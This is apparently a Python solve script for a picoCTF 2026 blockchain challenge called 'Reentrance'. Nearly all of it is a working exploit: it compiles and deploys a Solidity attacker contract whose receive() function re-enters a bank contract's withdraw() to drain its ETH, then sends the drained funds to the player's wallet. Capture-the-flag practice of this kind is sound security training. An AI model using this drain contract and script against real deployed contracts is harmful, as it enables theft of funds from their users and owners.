#!/usr/bin/env python3
"""
Reentrance - picoCTF 2026
Category: Blockchain | Points: 400

Exploits a classic reentrancy vulnerability in a SecureBank Solidity contract.
The withdraw() function sends ETH before updating the sender's balance,
allowing recursive re-entry from a malicious receive() function.

Requirements:
    pip install web3 py-solc-x solcx

Usage:
    python3 solve.py

    Set the following environment variables (or edit the defaults below):
        RPC_URL          - The challenge RPC endpoint
        PRIVATE_KEY      - Your player's private key
        BANK_ADDRESS     - The SecureBank contract address
        SETUP_ADDRESS    - The setup/flag contract address (optional)
"""

import os
import sys
import json
import time

try:
    from web3 import Web3
    from solcx import compile_source, install_solc
except ImportError:
    print("[!] Missing dependencies. Install with:")
    print("    pip install web3 py-solc-x")
    sys.exit(1)

# ─── Configuration ───────────────────────────────────────────────────────────
RPC_URL       = os.getenv("RPC_URL", "http://challenge-host:8545")
PRIVATE_KEY   = os.getenv("PRIVATE_KEY", "0xYOUR_PRIVATE_KEY_HERE")
BANK_ADDRESS  = os.getenv("BANK_ADDRESS", "0xBANK_CONTRACT_ADDRESS")
SETUP_ADDRESS = os.getenv("SETUP_ADDRESS", "")  # optional

DEPOSIT_AMOUNT = Web3.to_wei(0.001, "ether")  # Amount to seed the attack

# ─── Attacker Contract Source ────────────────────────────────────────────────
ATTACKER_SOURCE = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISecureBank {
    function deposit() external payable;
    function withdraw() external;
    function balances(address) external view returns (uint256);
}

contract Attacker {
    ISecureBank public target;
    address public owner;
    uint256 public reentrancyCount;

    constructor(address _target) {
        target = ISecureBank(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "Send some ETH to seed the attack");
        reentrancyCount = 0;
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        reentrancyCount++;
        if (address(target).balance > 0) {
            target.withdraw();
        }
    }

    function collectLoot() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
"""


def main():
    print("[*] Reentrance - picoCTF 2026 Exploit")
    print("=" * 50)

    # ─── Connect ─────────────────────────────────────────────────────────
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    if not w3.is_connected():
        print(f"[!] Cannot connect to RPC at {RPC_URL}")
        sys.exit(1)
    print(f"[+] Connected to RPC: {RPC_URL}")

    account = w3.eth.account.from_key(PRIVATE_KEY)
    player = account.address
    print(f"[+] Player address: {player}")

    bank_address = Web3.to_checksum_address(BANK_ADDRESS)
    bank_balance = w3.eth.get_balance(bank_address)
    print(f"[+] SecureBank address: {bank_address}")
    print(f"[+] SecureBank balance: {Web3.from_wei(bank_balance, 'ether')} ETH")

    if bank_balance == 0:
        print("[!] Bank is already empty. Challenge may already be solved.")

    # ─── Compile Attacker Contract ───────────────────────────────────────
    print("\n[*] Compiling attacker contract...")
    try:
        install_solc("0.8.20")
    except Exception:
        pass  # may already be installed

    compiled = compile_source(
        ATTACKER_SOURCE,
        output_values=["abi", "bin"],
        solc_version="0.8.20",
    )
    contract_id, contract_interface = compiled.popitem()
    abi = contract_interface["abi"]
    bytecode = contract_interface["bin"]
    print("[+] Attacker contract compiled successfully")

    # ─── Deploy Attacker Contract ────────────────────────────────────────
    print("\n[*] Deploying attacker contract...")
    AttackerContract = w3.eth.contract(abi=abi, bytecode=bytecode)

    tx = AttackerContract.constructor(bank_address).build_transaction({
        "from": player,
        "nonce": w3.eth.get_transaction_count(player),
        "gas": 3000000,
        "gasPrice": w3.eth.gas_price or Web3.to_wei(20, "gwei"),
    })
    signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

    attacker_address = receipt.contractAddress
    print(f"[+] Attacker deployed at: {attacker_address}")

    attacker = w3.eth.contract(address=attacker_address, abi=abi)

    # ─── Execute the Reentrancy Attack ───────────────────────────────────
    print(f"\n[*] Executing reentrancy attack with {Web3.from_wei(DEPOSIT_AMOUNT, 'ether')} ETH deposit...")
    tx = attacker.functions.attack().build_transaction({
        "from": player,
        "value": DEPOSIT_AMOUNT,
        "nonce": w3.eth.get_transaction_count(player),
        "gas": 5000000,
        "gasPrice": w3.eth.gas_price or Web3.to_wei(20, "gwei"),
    })
    signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

    if receipt.status == 1:
        print("[+] Attack transaction succeeded!")
    else:
        print("[!] Attack transaction reverted. The contract may have protections.")
        print("[*] Try increasing gas or adjusting the deposit amount.")
        sys.exit(1)

    # ─── Verify ──────────────────────────────────────────────────────────
    bank_balance_after = w3.eth.get_balance(bank_address)
    attacker_balance = w3.eth.get_balance(attacker_address)
    print(f"\n[*] Post-attack balances:")
    print(f"    SecureBank: {Web3.from_wei(bank_balance_after, 'ether')} ETH")
    print(f"    Attacker:   {Web3.from_wei(attacker_balance, 'ether')} ETH")

    if bank_balance_after == 0:
        print("\n[+] SecureBank has been completely drained!")
    else:
        print(f"\n[*] SecureBank still has {Web3.from_wei(bank_balance_after, 'ether')} ETH remaining.")
        print("[*] May need multiple attack rounds or a larger deposit.")

    # ─── Collect Loot ────────────────────────────────────────────────────
    print("\n[*] Collecting drained funds back to player...")
    tx = attacker.functions.collectLoot().build_transaction({
        "from": player,
        "nonce": w3.eth.get_transaction_count(player),
        "gas": 100000,
        "gasPrice": w3.eth.gas_price or Web3.to_wei(20, "gwei"),
    })
    signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"[+] Funds collected. Player balance: {Web3.from_wei(w3.eth.get_balance(player), 'ether')} ETH")

    # ─── Check if Solved ─────────────────────────────────────────────────
    if SETUP_ADDRESS:
        setup_addr = Web3.to_checksum_address(SETUP_ADDRESS)
        print(f"\n[*] Checking solve status on setup contract {setup_addr}...")
        # Try common isSolved() signature
        try:
            result = w3.eth.call({
                "to": setup_addr,
                "data": Web3.keccak(text="isSolved()")[:4].hex(),
            })
            solved = int(result.hex(), 16)
            if solved:
                print("[+] Challenge SOLVED! Check the challenge page for the flag.")
            else:
                print("[-] isSolved() returned false. The contract may need additional conditions.")
        except Exception as e:
            print(f"[*] Could not call isSolved(): {e}")
            print("[*] Check the challenge page manually for the flag.")
    else:
        print("\n[*] No SETUP_ADDRESS provided. Check the challenge page for the flag.")

    print("\n[*] Done!")


if __name__ == "__main__":
    main()
